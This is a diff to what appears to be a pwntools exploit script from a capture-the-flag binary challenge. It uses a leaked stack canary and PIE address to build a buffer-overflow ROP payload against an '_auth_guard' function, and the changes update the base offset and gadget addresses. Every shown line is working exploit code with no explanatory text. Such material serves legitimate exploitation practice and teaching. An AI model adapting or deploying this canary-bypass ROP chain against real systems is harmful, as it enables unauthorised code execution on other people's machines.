@@ -17,18 +17,18 @@ leaks = io.recvline().strip().decode().split('.')
 canary = int(leaks[0], 16)
 pie = int(leaks[1], 16)
 
-b.address = pie - 0x15e0
+b.address = pie - 0x162c
 success(f"Canary recovered: {hex(canary)}")
 success(f"PIE Base found:   {hex(b.address)}")
 
 # Proceed to _auth_guard overflow in the same session
 payload = flat([
     b"A"*40, canary, b"B"*8, 
-    b.address + 0x1440, # ret
-    b.address + 0x1436, # gadget 1
-    0, 1, 0x1206, 0x1161, 0xcafebab, 
+    b.address + 0x1498, # ret
+    b.address + 0x1482, # gadget 1 (_proc_ctx_1)
+    0x1337, 1, 0x1206, 0x1161, 0xcafebab, 
     b.address + 0x40b0, # k_dispatch_table
-    b.address + 0x1443  # gadget 2
+    b.address + 0x149b  # gadget 2 (_proc_ctx_2)
 ])
 
 io.sendafter(b": ", payload)
